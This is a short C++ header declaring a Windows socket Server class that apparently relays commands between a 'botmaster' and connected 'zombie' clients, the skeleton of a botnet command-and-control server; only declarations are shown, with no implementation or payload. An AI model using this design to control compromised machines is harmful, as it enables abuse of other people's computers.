#pragma once

#include <WS2tcpip.h>
#pragma comment (lib, "ws2_32.lib")

#include <iostream>
#include <string>
#include <vector>

#define WEIRDO	  0
#define BOTMASTER 1
#define ZOMBIE	  2

class Server
{
public:
	Server(std::string ip, int port);
	~Server();

	bool init();
	int cleanUp();

	bool createListeningSocket();
	int waitForConnection();

	void sendToZombies(const std::string& msg);
	bool sendToZombie(SOCKET zombie, const std::string& msg);
	bool sendToBotmaster(const std::string& msg);

	bool receive();
	std::string getMessage();

private:
	std::string m_IpAddress;
	int m_Port;

	SOCKET m_Listening = INVALID_SOCKET;
	SOCKET m_Botmaster = INVALID_SOCKET;

	std::vector<SOCKET> m_Zombies;

	char m_Buf[4096];
};